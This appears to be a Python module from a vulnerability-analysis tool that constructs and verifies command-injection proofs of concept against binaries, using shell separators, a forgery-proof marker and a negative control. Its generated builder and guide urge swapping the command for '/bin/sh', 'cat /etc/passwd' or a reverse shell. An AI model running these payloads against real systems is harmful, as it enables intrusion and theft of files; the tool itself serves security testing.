"""doc 58: construct a command-injection PoC (CWE-78). A top real-world class the memory-corruption
constructors don't touch, and a DIFFERENT confirmation oracle: not a control-flow breakpoint but a
runtime command-execution marker. Unsanitized input reaches a shell (`system`/`popen`/`sh -c`); a
shell separator ends the intended command and starts the attacker's. We inject `echo <nonce>` and
CONFIRM by detonation: the nonce appears in the output AND a benign input does NOT produce it.

Execution-gated (the target must run here, or once the operator supplies its deps); otherwise the
honest recipe stands.
"""
from __future__ import annotations

import logging

from ... import observe

_log = logging.getLogger(__name__)

#: shell separators to try, strongest/most-common first. Each ends the intended command (or opens a
#: substitution) so the injected `echo <nonce>` runs.
_SEPS = [("; ", ""), ("\n", ""), ("| ", ""), ("&& ", ""), ("& ", ""), ("$(", ")"), ("`", "`")]


def construct_command_injections(ctx, target) -> list:
    """For each CWE-78 sink, construct + DETONATE a command-injection PoC -> a poc-backed L3 (arbitrary
    command execution). Returns the filed finding ids."""
    from ...db.dao import FindingDAO
    from . import attribution, channels, construct, detonate
    fids = []
    try:
        fd = FindingDAO(ctx.conn)
        all_f = fd.list_by_target(target.id)
        if any((f.dedup_key or "").startswith("poc:CWE-78:") for f in all_f):
            return []
        leads = [f for f in all_f if f.cwe == "CWE-78" and f.function_addr]
        if not leads:
            return []
        staged = ctx.scratch() / "cmdi-construct" / (getattr(target, "filename", None) or "target.bin")
        staged.parent.mkdir(parents=True, exist_ok=True)
        ctx.content.stage_target(target, staged.parent, staged.name)
        staged.chmod(0o755)
        exe = str(staged)
        scratch_dir = str(staged.parent)
        # the channels the program actually reads, highest-signal first: the tainted input is not
        # always on stdin (argv / a file argument / an env var are common on pulled binaries).
        specs = channels.delivery_specs(ctx, target)
        done = set()
        for lead in leads:
            fa = lead.function_addr
            if fa in done:
                continue
            done.add(fa)
            hit = None
            for mode, env_name in specs:
                for pre, post in _SEPS:
                    # FORGERY-PROOF marker: inject a command whose output (solved arithmetic) differs
                    # from its source text, so a target that merely ECHOES the input (printf(buf),
                    # cat, a reflecting server) cannot fake the signal -- `proves` requires the solved
                    # form present AND the raw command text absent. A fresh challenge per attempt.
                    markers = attribution.make_code_markers()
                    payload = (pre.encode() + markers.command + post.encode() + b"\n")
                    if not detonate.runs_injected_command(exe, payload, proof=markers.proves,
                                                          input_mode=mode, env_name=env_name,
                                                          scratch_dir=scratch_dir):
                        continue
                    # negative control: a benign input on the SAME channel must NOT prove execution
                    if detonate.runs_injected_command(exe, b"benign-input\n", proof=markers.proves,
                                                      input_mode=mode, env_name=env_name,
                                                      scratch_dir=scratch_dir):
                        continue
                    hit = (mode, env_name, pre, post, payload)
                    break
                if hit:
                    break
            if not hit:
                continue
            mode, env_name, pre, post, payload = hit
            binname = getattr(target, "filename", None) or "./target"
            sep_disp = repr(pre)
            where = channels.channel_phrase(mode, env_name)
            deliver = channels.deliver_line(mode, binname, env_name)
            soundness = [
                f"unsanitized input (from {where}) reaches a shell command (system/popen) -- the "
                "input is concatenated into the command string (the CWE-78 site)",
                f"the separator {sep_disp} ends the intended command and starts the attacker's",
                "DETONATED: the injected command was EVALUATED by a shell -- an arithmetic challenge "
                "in the payload appears SOLVED in the output while its raw source text does not, so a "
                "program that merely ECHOES the input cannot fake the signal; a benign input does not "
                "produce the solved form",
            ]
            reproduce = (
                "# CWE-78 command injection\n"
                f"# your input (via {where}) is concatenated into a shell command; the separator "
                "injects your own.\n"
                f"# payload = {sep_disp} + 'echo <nonce>' (the attached poc-input artifact; save as poc.bin)\n"
                f"{deliver}"
            )
            fid = construct.record_constructed_poc(
                ctx, target, cwe="CWE-78", technique="command injection via shell separator",
                level="L3", payload=payload, soundness=soundness, reproduce=reproduce,
                input_mode=mode, detector="cmdi_construct",
                dedup_key=f"poc:CWE-78:cmd-inject:{fa}:{target.id}",
                title=f"Command injection -> arbitrary command execution at {fa}",
                summary=f"shell separator {sep_disp} injects an attacker command into system() via "
                        f"{where}; execution confirmed by a detonated marker",
                lead=lead, detonated=True,
                signal_name="injected command executed (echo marker observed)",
                function_addr=fa, site_addr=lead.site_addr,
                extra_evidence=_cmdi_builder(binname, pre, post, mode, env_name))
            if fid:
                fids.append(fid)
    except Exception:                                      # noqa: BLE001 -- best-effort
        observe.absorbed(_log, "command-injection construct failed")
    return fids


def _cmdi_builder(binname, pre, post, mode="stdin", env_name=None) -> list:
    """Retarget knobs + an editable builder: it IS arbitrary command execution -- change the command."""
    from . import channels
    deliver = channels.deliver_line(mode, binname, env_name)
    where = channels.channel_phrase(mode, env_name)
    usage = (
        "WHAT IT IS — a tiny builder: it emits the input that injects your command into the shell "
        "the program runs.\n"
        "WORKFLOW —\n"
        "1. Download the builder (`poc.py`) below.\n"
        "2. Build the payload: `python3 poc.py > poc.bin`.\n"
        f"3. Deliver it (via {where}): `{deliver}` — your command runs.\n"
        f"ON SOURCE — build the source first (e.g. `gcc -o {binname} src.c`), then run the builder "
        "on the compiled binary. The Code view shows the system()/popen() sink."
    )
    guide = (
        "This PoC injects a command into the shell the program invokes. Edit the knob in the builder:\n"
        "- COMMAND (`echo <nonce>`) — the command the shell runs. It is ARBITRARY command execution: "
        "set it to anything.\n"
        "- RCE / shell — set COMMAND to `/bin/sh` for an interactive shell, `cat /etc/passwd` to read "
        "files, or a reverse-shell one-liner. No memory corruption or bypass needed.\n"
        f"- SEPARATOR ({pre!r}) — the shell metacharacter that ends the intended command; already "
        "confirmed working for this target.\n"
        f"- CHANNEL — the payload is delivered via {where}; confirmed working for this target."
    )
    close = repr(post) if post else "''"
    script = (
        "#!/usr/bin/env python3\n"
        "# CWE-78 command injection PoC -- arbitrary command execution. EDIT COMMAND to run anything.\n"
        "import sys\n\n"
        f"SEPARATOR = {pre!r}      # ends the intended command and starts yours\n"
        "COMMAND   = \"id\"          # <-- your command: \"/bin/sh\", \"cat /etc/passwd\", a reverse shell…\n"
        f"CLOSE     = {close}       # closes a substitution if the separator opened one\n\n"
        "sys.stdout.buffer.write((SEPARATOR + COMMAND + CLOSE + \"\\n\").encode())\n"
        f"# run:  python3 poc.py > poc.bin ;  {deliver}\n"
    )
    return [{"channel": "builder-usage", "detail": usage},
            {"channel": "customize", "detail": guide},
            {"channel": "exploit-script", "detail": script}]
